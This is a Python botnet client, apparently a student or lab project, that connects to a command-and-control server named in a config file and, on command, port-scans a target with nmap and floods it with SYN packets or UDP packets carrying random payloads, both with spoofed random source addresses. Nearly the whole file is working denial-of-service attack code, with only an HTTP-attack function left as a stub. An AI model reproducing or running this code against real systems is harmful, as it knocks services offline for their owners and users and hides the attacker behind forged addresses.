#Author Karun Sharma
import socket
from scapy.all import *
import random
import nmap
import string
import requests
import uuid

def synflood(TARGET,TARGETPORT):
	PACKETS_TO_SEND = 1000

	for index in range(PACKETS_TO_SEND):
		ippacket = IP()
		ippacket.src = '.'.join(str(random.randint(0,255)) for inner in range(4))
		ippacket.dst = TARGET

		tcppacket = TCP()
		tcppacket.sport = random.randint(0,65535)
		tcppacket.dport = TARGETPORT
		tcppacket.flags = 'S'
		p1 = ippacket / tcppacket
		send(p1, verbose=0)


def generaterandomstring():
	return ''.join(random.choice(string.ascii_lowercase) for index in range(random.randint(0,1000)))

def randombyteflooding(TARGET):
	for index in range(1000):
		ippacket = IP()
		ippacket.dst = TARGET
		ippacket.src = '.'.join(str(random.randint(0,255)) for inner in range(4))

		udppacket = UDP()

		sr(ippacket/udppacket/generaterandomstring(),timeout=2)

def httpattack():
	"""
	Once a bot establishes a connection to a VM server
	As long as the connection remains active, it will send random HTTP GET or POST requests
	These post requests consist of numerous cookies
	"""

	cookies = dict()
	


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

HOST_SERVER = ' '

with open("Config.txt", 'r') as file:
	content = file.readlines()
	lines = content[1]
	HOST_SERVER = lines[13:]
	HOST_SERVER = HOST_SERVER.rstrip()

print('HOST_SERVER = ', HOST_SERVER)

s.connect((HOST_SERVER,11111)) #Reference to local server VM

STATUS = 'READY TO ATTACK'

while True:
	data = s.recv(1024)
	parseddata = data.split("\t")
	if "STATUS" in data:
		s.send(STATUS)

	if "EXIT" in data:
		break

	if parseddata[0] == "SYN FLOOD":
		if STATUS != "READY TO ATTACK":
			s.send(STATUS)
		else:
			STATUS = "ATTACKING USING SYN FLOOD"
			nm = nmap.PortScanner()
			nm.scan(parseddata[3],'1-65535')
			getopenports = nm[parseddata[3]].all_tcp()
			for index in range(len(getopenports)):
				synflood(parseddata[3],getopenports[index])
			with open("log.txt", 'a') as f:
				f.write(str(nm[parseddata[3]].all_tcp()))

	if parseddata[0] == "FLOODING":
		randombyteflooding(parseddata[1])

			#s.send(str(nm.scaninfo()))

	print("Data receieved: {}".format(data))

s.close()
